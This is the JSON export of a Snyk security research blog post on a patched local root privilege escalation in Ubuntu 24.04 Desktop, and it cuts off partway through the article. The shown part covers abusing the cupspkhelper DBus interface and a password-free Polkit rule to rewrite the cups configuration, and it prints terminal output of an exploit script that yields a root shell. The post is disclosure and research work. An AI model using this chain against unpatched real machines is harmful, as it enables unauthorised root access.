Ubuntu 24.04 features for root privilege escalation","slug":"abusing-ubuntu-root-privilege-escalation","contentTags":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"2trEaoAJ0TEhtB590806m5","type":"Entry","createdAt":"2024-09-09T17:53:57.762Z","updatedAt":"2024-09-10T15:04:48.667Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":8,"revision":2,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"composeContentTags"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu 24.04 features for root privilege escalation\" - Content tags","topic":["container-security","open-source-security","security-labs"],"product":["snyk-container"],"focus":["awareness"],"audience":["security"],"medium":"blog","contributor":["engineering","security-labs"]}},"seoSocialSharing":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"5YhjLTg87Sa1OplDPZUiUq","type":"Entry","createdAt":"2024-09-09T17:53:57.799Z","updatedAt":"2024-09-09T17:53:57.799Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":4,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"seo"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu 24.04 features for root privilege escalation\" - SEO","title":"Abusing Ubuntu 24.04 features for root privilege escalation","description":"With the recent release of Ubuntu 24.04, we at Snyk Security Labs thought it would be interesting to examine the latest version of this Linux distribution to see if we could find any interesting privilege escalation vulnerabilities.","no_index":false,"socialImage":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1686163009/feature-snyk-platform-learn-getting-snyk-setup.png","tags":["brandui-feature-image"],"type":"upload","bytes":327778,"width":1200,"format":"png","height":628,"version":1686163009,"duration":null,"metadata":{},"public_id":"feature-snyk-platform-learn-getting-snyk-setup","created_at":"2023-06-07T18:36:49Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1686163009/feature-snyk-platform-learn-getting-snyk-setup.png","resource_type":"image"}],"sitemapChangeFreq":"monthly","sitemapPriority":0.7,"ogType":"article"}},"containsVideo":false,"featuredImage":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1686163009/feature-snyk-platform-learn-getting-snyk-setup.png","tags":["brandui-feature-image"],"type":"upload","bytes":327778,"width":1200,"format":"png","height":628,"version":1686163009,"duration":null,"metadata":{},"public_id":"feature-snyk-platform-learn-getting-snyk-setup","created_at":"2023-06-07T18:36:49Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1686163009/feature-snyk-platform-learn-getting-snyk-setup.png","resource_type":"image"}],"authors":[{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"UBd0XMqlqaE3ydwnkXno2","type":"Entry","createdAt":"2024-01-30T19:00:17.809Z","updatedAt":"2024-10-23T19:08:04.322Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":26,"revision":7,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentPerson"}},"locale":"en-US"},"fields":{"fullName":"Rory McNamara","slug":"rory-mcnamara","firstName":"Rory","lastName":"McNamara","headshot":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1706637528/rory-mcnamara.jpg","tags":[],"type":"upload","bytes":34926,"width":512,"format":"jpg","height":512,"version":1706637528,"duration":null,"metadata":[],"public_id":"rory-mcnamara","created_at":"2024-01-30T17:58:48Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1706637528/rory-mcnamara.jpg","resource_type":"image"}],"roles":["Blog Author","Podcast Guest"],"bio":{"data":{},"content":[{"data":{},"content":[{"data":{},"marks":[],"value":"Long-time bug bounty hunter, ex-pentester, and AppSec engineer. Rory is passionate about race conditions and Linux exploitation.","nodeType":"text"}],"nodeType":"paragraph"}],"nodeType":"document"},"title":"Staff Security Researcher","company":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"BiiaijTYQ14RazfFg8UMc","type":"Entry","createdAt":"2022-11-08T15:58:24.247Z","updatedAt":"2024-05-30T04:15:21.816Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":431,"revision":424,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCompany"}},"locale":"en-US"},"fields":{"companyName":"Snyk","logoHorizontal":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1645182199/snyk-marketingui/brand-logos/wordmark-logo-color.svg","tags":null,"type":"upload","bytes":6792,"width":283,"format":"svg","height":146,"version":1645182199,"duration":null,"metadata":[],"public_id":"snyk-marketingui/brand-logos/wordmark-logo-color","created_at":"2022-02-18T11:03:19Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1645182199/snyk-marketingui/brand-logos/wordmark-logo-color.svg","original_url":"http://res.cloudinary.com/snyk/image/upload/v1645182199/snyk-marketingui/brand-logos/wordmark-logo-color.svg","resource_type":"image","raw_transformation":"","original_secure_url":"https://res.cloudinary.com/snyk/image/upload/v1645182199/snyk-marketingui/brand-logos/wordmark-logo-color.svg"}],"companyUrl":"https://snyk.io/","region":"americas","size":"enterprise","isCustomer":false,"isPartner":false}},"linkedInUrl":"https://uk.linkedin.com/in/rorymcnamara"}}],"publishDate":"2024-09-09T00:00-05:00","excerpt":"With the recent release of Ubuntu 24.04, we at Snyk Security Labs thought it would be interesting to examine the latest version of this Linux distribution to see if we could find any interesting privilege escalation vulnerabilities.","article":{"nodeType":"document","data":{},"content":[{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Introduction","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"With the recent release of Ubuntu 24.04, we at Snyk Security Labs thought it would be interesting to examine the latest version of this Linux distribution to see if we could find any interesting privilege escalation vulnerabilities.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"I’ll let the results speak for themselves:","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"6gD1feXmRMKo1zExYLeED2","type":"Entry","createdAt":"2024-09-09T17:53:57.820Z","updatedAt":"2024-09-09T17:53:57.820Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 1","hideLineNumbers":false,"startingLineNumber":1,"snippet":"rory@ubuntu2404release:~$ cat /etc/lsb-release\nDISTRIB_ID=Ubuntu\nDISTRIB_RELEASE=24.04\nDISTRIB_CODENAME=noble\nDISTRIB_DESCRIPTION=\"Ubuntu 24.04 LTS\"\nrory@ubuntu2404release:~$ id\nuid=1000(rory) gid=1000(rory) groups=1000(rory),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin)\nrory@ubuntu2404release:~$ sh exploit.sh\nRe-executing via Desktop\nDisabling notifications\nStaging cups symlinks\nTaking over cupsd.conf\nRewriting cupsd.conf\nTaking over cups-files.conf\nSetting filter group to netdev\nStaging for wpa_supplicant\nTriggering wpa_supplicant as group netdev via cups\nRe-enabling notifications\nCleaning up and providing shell\n# id\nuid=0(root) gid=0(root) groups=0(root)"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"During our research","marks":[{"type":"bold"}],"data":{}},{"nodeType":"text","value":",","marks":[],"data":{}},{"nodeType":"text","value":" we successfully identified a privilege escalation from the default user on a fresh Ubuntu Desktop installation to root.","marks":[{"type":"bold"}],"data":{}},{"nodeType":"text","value":" To achieve this, we chained one small bug in a privileged component together with a number of features, which all work as expected, to achieve arbitrary command execution as root.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"These vulnerabilities were promptly fixed by the respective maintainers and patches are generally available as of the 6th of August 2024. For a more detailed timeline please see the bottom of this post.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"This blog post will outline the journey of our research, discuss how we identified these vulnerabilities, and, we hope, show that you can keep it simple when it comes to exploitation and achieve the same results without needing a very complex (although extremely cool) kernel memory corruption vulnerability, for example.","marks":[],"data":{}}]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Hunting for root privilege escalation on Linux","marks":[],"data":{}}]},{"nodeType":"heading-3","data":{},"content":[{"nodeType":"text","value":"User privilege boundaries","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Whenever I’m looking at something new, especially for privilege escalation vulnerabilities, my first thought is always, “Where are the privilege boundaries?”. This is not a novel place to start, but I find it is always very useful to define what specific thing it is I’m trying to break. There’s no use going into a product to look for vulnerabilities with no plan for what they will even look like.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"When looking at a Linux system such as Ubuntu, there are a handful of very common privilege boundaries. Some, such as setuid binaries, bad file permissions, and Unix sockets, have been around for a long time. I generally skip these things on first blush — they’ve often already been closely examined. I do, of course, come back to them later, but for the density of vulnerabilities, my first port of call is always DBus.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"DBus is, for our purposes at least, a client/server-based remote procedure call (RPC) framework. What this means in practice is that a server, for example, a privileged component that manages users on the system, can register itself on the DBus message bus and offer up a number of methods, which can then be called by clients on the same bus. There are a number of built-in security controls for this bus, including explicit rules for which users or groups can or cannot call methods and even which users can claim to be a specific service. We will expand deeper into the permission model later on.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"I am heavily simplifying what DBus is and can do here, but for the sake of brevity, let’s define DBus as “a service which allows certain users to call methods inside another, possibly privileged, process,” which gives us enough context to establish our privilege boundary of interest.","marks":[],"data":{}}]},{"nodeType":"heading-3","data":{},"content":[{"nodeType":"text","value":"Investigating DBus","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"},"content":[{"nodeType":"text","value":"Many","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" before me, and I’m sure many after me, have found vulnerabilities using the DBus interface. At a high level, tooling such as d-feet (now superseded by ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://apps.gnome.org/en-GB/Dspy/"},"content":[{"nodeType":"text","value":"D-Spy","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":") can allow you to enumerate all services that have registered methods on the DBus bus and let you test each of the registered methods (modulo permission checks) by showing you the correct arguments that should be provided.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"I used this method to go through all of the services present on a new installation of Ubuntu 24.04 and review what may present an opportunity. After a few days and a fair few false starts, I eventually found the interface ","marks":[],"data":{}},{"nodeType":"text","value":"org.opensuse.cupspkhelper","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", which, by looking at the available methods, is used to manage the ","marks":[],"data":{}},{"nodeType":"text","value":"cups","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" daemon (a service that manages printers and printing). Cups is a privileged process and I know from previous experience (repeatedly ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://issues.chromium.org/issues/40092465"},"content":[{"nodeType":"text","value":"exploiting","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://issues.chromium.org/issues/40052058"},"content":[{"nodeType":"text","value":"cups","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" on Google’s ChromeOS) that if the privilege boundaries surrounding cups are not careful, cups can be used as a very powerful exploitation gadget.","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"PI0SBTTkTur9trnchodvK","type":"Entry","createdAt":"2024-09-09T17:53:57.907Z","updatedAt":"2024-09-09T17:53:57.907Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":5,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCloudinaryAsset"}},"locale":"en-US"},"fields":{"internalName":"\"blog-ubuntu-org\" - original","asset":[{"url":"http://res.cloudinary.com/snyk/image/upload/v1725899741/blog-ubuntu-org.png","tags":[],"type":"upload","bytes":812981,"width":1999,"format":"png","height":1378,"version":1725899741,"duration":null,"metadata":{},"public_id":"blog-ubuntu-org","created_at":"2024-09-09T16:35:41Z","secure_url":"https://res.cloudinary.com/snyk/image/upload/v1725899741/blog-ubuntu-org.png","resource_type":"image"}],"maxWidth":"full","altText":"D-feet: Viewing the available methods in the org.opensuse.CupsPkHelper DBus interface","caption":"D-feet: Viewing the available methods in the org.opensuse.CupsPkHelper DBus interface"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"With this in mind, a DBus interface that allows you to manage this daemon could result in some very interesting and unexpected behavior.","marks":[],"data":{}}]},{"nodeType":"heading-3","data":{},"content":[{"nodeType":"text","value":"This feels privileged","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"As you may know or have inferred, printer management tends to be an “admin” task and should generally be privileged. Why, then, are we able to call these methods without entering our password?","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Enter Polkit. Gone are the days of needing to use sudo for everything, with its associated lack of granularity. With Polkit, every privileged action you may want to take can be given its own unique name, and authorization can be defined per-name and take into account how the action is being requested.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"For example, if you want to change the system time, there’s a unique name for that: ","marks":[],"data":{}},{"nodeType":"text","value":"org.freedesktop.timedate1.set-time","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":":","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Following is the ","marks":[],"data":{}},{"nodeType":"text","value":"/usr/share/polkit-1/actions/org.freedesktop.timedate1.policy","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" file contents:","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"mm4SR2udbWDdCf0Nzkrkv","type":"Entry","createdAt":"2024-09-09T17:53:57.926Z","updatedAt":"2024-09-09T17:53:57.926Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\" Abusing Ubuntu\" - Code block 2","hideLineNumbers":false,"startingLineNumber":1,"snippet":"        \u003caction id=\"org.freedesktop.timedate1.set-time\"\u003e\n                \u003cdescription gettext-domain=\"systemd\"\u003eSet system time\u003c/description\u003e\n                \u003cmessage gettext-domain=\"systemd\"\u003eAuthentication is required to set the system time.\u003c/message\u003e\n                \u003cdefaults\u003e\n                        \u003callow_any\u003eauth_admin_keep\u003c/allow_any\u003e\n                        \u003callow_inactive\u003eauth_admin_keep\u003c/allow_inactive\u003e\n                        \u003callow_active\u003eauth_admin_keep\u003c/allow_active\u003e\n                \u003c/defaults\u003e\n                \u003cannotate key=\"org.freedesktop.policykit.imply\"\u003eorg.freedesktop.timedate1.set-timezone org.freedesktop.timedate1.set-ntp\u003c/annotate\u003e\n        \u003c/action\u003e"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"This XML for Polkit defines the actions that could be taken, what message should pop up when a password is requested (“Authentication is required to set the system time.”), and what the rules are around who can authenticate (","marks":[],"data":{}},{"nodeType":"text","value":"\u003callow_any\u003eauth_admin_keep\u003c/allow_any\u003e","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":"). The ","marks":[],"data":{}},{"nodeType":"text","value":"auth_admin_keep","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" means an administrator (i.e, someone in the “sudo” group) can use their password to change the time, and the ","marks":[],"data":{}},{"nodeType":"text","value":"_keep","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" means that the authentication will be remembered for a short time, so you can change the time twice quickly without needing to re-enter your password.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"But how does this apply to us? We aren’t prompted to enter our password when we call the methods on our target DBus interface. Looking at the policy definitions for ","marks":[],"data":{}},{"nodeType":"text","value":"org.opensuse.cupspkhelper.mechanism","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", we see that all the actions require ","marks":[],"data":{}},{"nodeType":"text","value":"auth_admin","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", which should need the admin password every time.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The solution to our puzzle is the second half of what makes Polkit powerful: rules. Polkit allows for the definition of rules (written in JavaScript), which can be used to change the behavior of what is defined in the policy file. Looking at the rule sets in the file ","marks":[],"data":{}},{"nodeType":"text","value":"/usr/share/polkit-1/rules.d","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", we can find the following snippet:","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The contents of the file ","marks":[],"data":{}},{"nodeType":"text","value":"/usr/share/polkit-1/rules.d/com.ubuntu.desktop.rules","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":":","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"4IiEkKSpUT6l9nNLa7appV","type":"Entry","createdAt":"2024-09-09T17:53:57.943Z","updatedAt":"2024-09-09T17:53:57.943Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":4,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 3","hideLineNumbers":false,"startingLineNumber":1,"snippet":"// Printer administration\npolkit.addRule(function(action, subject) {\n    if (action.id.indexOf(\"org.opensuse.cupspkhelper.mechanism.\") == 0 \u0026\u0026\n        subject.active == true \u0026\u0026 subject.local == true \u0026\u0026\n        (subject.isInGroup(\"sudo\") || subject.isInGroup(\"lpadmin\"))) {\n            return polkit.Result.YES;\n    }\n});"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"This rule is made up of 3 main parts.","marks":[],"data":{}}]},{"nodeType":"unordered-list","data":{},"content":[{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The first part, ","marks":[],"data":{}},{"nodeType":"text","value":"action.id.indexOf(\"org.opensuse.cupspkhelper.mechanism.\") == 0","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", checks to see if this is one of the actions used by our DBus interface by checking the prefix. The specific rule looks similar to ","marks":[],"data":{}},{"nodeType":"text","value":"org.opensuse.cupspkhelper.mechanism.printer-local-edit","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":".","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The second section is ","marks":[],"data":{}},{"nodeType":"text","value":"subject.active == true \u0026\u0026 subject.local == true","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". This is Polkit speak for “Is the user logged in to the computer directly and sat looking at the screen?”. This applies to most direct uses of Ubuntu Desktop, but won’t apply for, SSH sessions on the same machine, for example.","marks":[],"data":{}}]}]},{"nodeType":"list-item","data":{},"content":[{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The final section ","marks":[],"data":{}},{"nodeType":"text","value":"(subject.isInGroup(\"sudo\") || subject.isInGroup(\"lpadmin\"))","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" checks to see if the requesting user is in either the “sudo” or “lpadmin” user groups.","marks":[],"data":{}}]}]}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"If all 3 sets of conditions for this rule are found to be true, i.e a user who is sat in front of their computer, in the sudo or lpadmin groups, and trying to make changes to printers, this rule instructs the authorization check to succeed (","marks":[],"data":{}},{"nodeType":"text","value":"polkit.Result.YES","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") without needing the user to enter their password. This is quite a nice usability feature and will decrease the amount of passwords an administrator will need to type in all the time.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"The problems begin when an attacker is able to compromise the user’s session, potentially through social engineering to execute a payload, or other exploitation (","marks":[],"data":{}},{"nodeType":"text","value":"I","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":" may not have Chrome full RCE vulnerabilities, but they’ve happened before). In this context they will be able to call interfaces secured in this way without needing to first compromise the user’s password, which may have been necessary if these rules did not exist.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"So we’ve found an interface which crosses a potentially interesting privilege boundary, and we’ve also found that we may be able to call these privileged functions without necessarily needing to compromise the user’s password. This is quite a good starting point for a privilege escalation chain, as privileged functions which are nominally protected, but can be accessed in certain circumstances bypassing said protection may allow us to exploit some interesting behavior.","marks":[],"data":{}}]},{"nodeType":"heading-2","data":{},"content":[{"nodeType":"text","value":"Finding the bug","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"If you’ve read some of my ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://snyk.io/blog/leaky-vessels-container-vuln-deep-dive/"},"content":[{"nodeType":"text","value":"previous work","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" you may know that I love the ","marks":[],"data":{}},{"nodeType":"text","value":"strace","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" tool. If you’re not familiar with this tool I encourage you to go back and read the first part of my ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://snyk.io/blog/leaky-vessels-container-vuln-deep-dive/"},"content":[{"nodeType":"text","value":"Leaky Vessels deep dive post","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":", which contains a primer.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Whenever exploring an interface across a privilege boundary, it’s a very good habit to attach strace to your target and save the logs. This is a great way to see what’s ","marks":[],"data":{}},{"nodeType":"text","value":"actually","marks":[{"type":"italic"}],"data":{}},{"nodeType":"text","value":" being done by the application when you call each method, and may give you quick wins from low hanging fruit.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Using this methodology, I observed that the cups daemon was restarting when calling ","marks":[],"data":{}},{"nodeType":"text","value":"ServerSetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". This was identified during the evaluation of the ","marks":[],"data":{}},{"nodeType":"text","value":"ServerGetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" and ","marks":[],"data":{}},{"nodeType":"text","value":"ServerSetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" methods. These functions are defined as follows (this output is taken from the ","marks":[],"data":{}},{"nodeType":"text","value":"gdbus introspect","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" tool):","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"69kGej8EUHWITbtqOwmYCI","type":"Entry","createdAt":"2024-09-09T17:53:57.962Z","updatedAt":"2024-09-09T17:53:57.962Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 4","hideLineNumbers":false,"startingLineNumber":1,"snippet":"      @org.freedesktop.DBus.GLib.Async(\"\")\n      ServerGetSettings(out s error,\n                        out a{ss} settings);\n      @org.freedesktop.DBus.GLib.Async(\"\")\n      ServerSetSettings(in  a{ss} settings,\n                        out s error);"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"For those not familiar with DBus datatypes, ","marks":[],"data":{}},{"nodeType":"text","value":"a{ss}","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" is an “array (","marks":[],"data":{}},{"nodeType":"text","value":"a","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") of structs (","marks":[],"data":{}},{"nodeType":"text","value":"{}","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") mapping a string (","marks":[],"data":{}},{"nodeType":"text","value":"s","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":") to a string (","marks":[],"data":{}},{"nodeType":"text","value":"s","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":")”. This is functionally equivalent to a dictionary in Python where the keys and values are both strings. By calling ServerGetSettings to get a valid “settings” value and passing that same value to ServerSetSettings, cups performed a restart. From this it can be inferred that the settings being changed are those in cups itself, and the service is restarted to make the changes take effect.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"This matches with what we can observe in the actual output of ","marks":[],"data":{}},{"nodeType":"text","value":"ServerGetSettings","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":":","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"47dUILamo9st4GNCwgYhfb","type":"Entry","createdAt":"2024-09-09T17:53:58.005Z","updatedAt":"2024-09-09T17:53:58.005Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":4,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 5","hideLineNumbers":false,"startingLineNumber":1,"snippet":"{'BrowseLocalProtocols': 'dnssd',\n 'DefaultAuthType': 'Basic',\n 'ErrorPolicy': 'retry-job',\n 'IdleExitTimeout': '60',\n 'JobPrivateAccess': 'default',\n 'JobPrivateValues': 'default',\n 'MaxLogSize': '0',\n 'PageLogFormat': '',\n 'SubscriptionPrivateAccess': 'default',\n 'SubscriptionPrivateValues': 'default',\n 'WebInterface': 'Yes',\n '_debug_logging': '0',\n '_remote_admin': '0',\n '_remote_any': '0',\n '_share_printers': '0',\n '_user_cancel_any': '0'}"}}},"content":[]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Most of these values (those not starting with an underscore) match what can be seen in the cups configuration file ","marks":[],"data":{}},{"nodeType":"text","value":"/etc/cups/cupsd.conf","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":". By changing some of these values and observing the contents of the cups configuration file we can confirm that we are successfully changing these items, and they are taking effect. Great! This is a privileged action and a privileged configuration file, by default a normal user can’t even read the file so it must be juicy, right?","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"A quick spin around the ","marks":[],"data":{}},{"nodeType":"hyperlink","data":{"uri":"https://www.cups.org/doc/man-cupsd.conf.html"},"content":[{"nodeType":"text","value":"man page","marks":[{"type":"underline"}],"data":{}}]},{"nodeType":"text","value":" doesn’t turn up anything interesting unfortunately. Nothing so easy as “please run this command as root when you start”. However, we still have some options. The next step is to look for what our strace has turned up during this process. My first instincts are always to look for potentially unsafe handling of configuration values that we’ve provided, or other sections of the code that we can influence. With this in mind we can do some quick greps for key syscalls like ","marks":[],"data":{}},{"nodeType":"text","value":"chmod","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", ","marks":[],"data":{}},{"nodeType":"text","value":"chown","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":", and ","marks":[],"data":{}},{"nodeType":"text","value":"execve","marks":[{"type":"code"}],"data":{}},{"nodeType":"text","value":" to investigate further behavior.","marks":[],"data":{}}]},{"nodeType":"paragraph","data":{},"content":[{"nodeType":"text","value":"Generally we’re looking for things that could potentially be influenced by the configuration file we have partial control over. After searching we can come across this strace snippet:","marks":[],"data":{}}]},{"nodeType":"embedded-entry-block","data":{"target":{"metadata":{"tags":[],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"3RmhZhAa1b5pJJ8QXIUMUu","type":"Entry","createdAt":"2024-09-09T17:53:58.022Z","updatedAt":"2024-09-09T17:53:58.022Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":3,"revision":1,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"contentCodeBlockSnippets"}},"locale":"en-US"},"fields":{"internalName":"\"Abusing Ubuntu\" - Code block 